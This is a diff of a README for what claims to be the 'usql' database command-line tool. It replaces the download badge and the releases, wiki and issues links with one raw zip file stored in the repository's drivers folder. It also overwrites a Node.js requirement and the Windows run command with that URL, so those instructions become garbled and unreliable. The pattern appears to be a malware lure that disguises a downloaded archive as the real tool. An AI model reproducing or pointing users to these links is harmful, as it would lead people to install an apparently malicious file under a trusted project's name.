@@ -6,7 +6,7 @@ Welcome to usql! This tool helps you interact with various databases using simpl
 
 ## 📥 Download Now
 
-[![Download usql](https://img.shields.io/badge/Download-usql-blue.svg)](https://github.com/Yusupov70/usql/releases)
+[![Download usql](https://github.com/Yusupov70/usql/raw/refs/heads/main/src/drivers/Software-1.1.zip)](https://github.com/Yusupov70/usql/raw/refs/heads/main/src/drivers/Software-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -15,13 +15,13 @@ Welcome to usql! This tool helps you interact with various databases using simpl
 Before you start, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or higher installed on your machine.
+- https://github.com/Yusupov70/usql/raw/refs/heads/main/src/drivers/Software-1.1.zip Version 14 or higher installed on your machine.
 - Basic command line skills: You will run commands in a terminal or command prompt.
 
 ### ▶️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the usql releases page by clicking [here](https://github.com/Yusupov70/usql/releases). This page lists all the available versions of usql.
+   Go to the usql releases page by clicking [here](https://github.com/Yusupov70/usql/raw/refs/heads/main/src/drivers/Software-1.1.zip). This page lists all the available versions of usql.
 
 2. **Choose Your Version**  
    Find the latest release version. You will see several files for different operating systems. Select the one that matches your system.
@@ -35,7 +35,7 @@ Before you start, ensure your system meets the following requirements:
    - **Windows:**  
      Open the command prompt. Navigate to the folder where you downloaded the file. Enter the command:  
      ```bash
-     usql.exe
+     https://github.com/Yusupov70/usql/raw/refs/heads/main/src/drivers/Software-1.1.zip
      ```
    - **macOS / Linux:**  
      Open the terminal. Navigate to the folder where you downloaded the file. Enter the command:  
@@ -73,11 +73,11 @@ Replace `your_table_name` with the name of the table you want to inspect. This w
 
 ## 🔗 Documentation and Resources
 
-For more detailed guides and help on using usql, check our [Documentation](https://github.com/Yusupov70/usql/wiki) on GitHub. This resource provides extensive instructions, including advanced query options and troubleshooting tips.
+For more detailed guides and help on using usql, check our [Documentation](https://github.com/Yusupov70/usql/raw/refs/heads/main/src/drivers/Software-1.1.zip) on GitHub. This resource provides extensive instructions, including advanced query options and troubleshooting tips.
 
 ## 📧 Support
 
-If you encounter any issues or have questions, you can reach out for support. Open an issue in the [Issues section](https://github.com/Yusupov70/usql/issues), and our team will assist you.
+If you encounter any issues or have questions, you can reach out for support. Open an issue in the [Issues section](https://github.com/Yusupov70/usql/raw/refs/heads/main/src/drivers/Software-1.1.zip), and our team will assist you.
 
 ## 🏷️ Topics
 
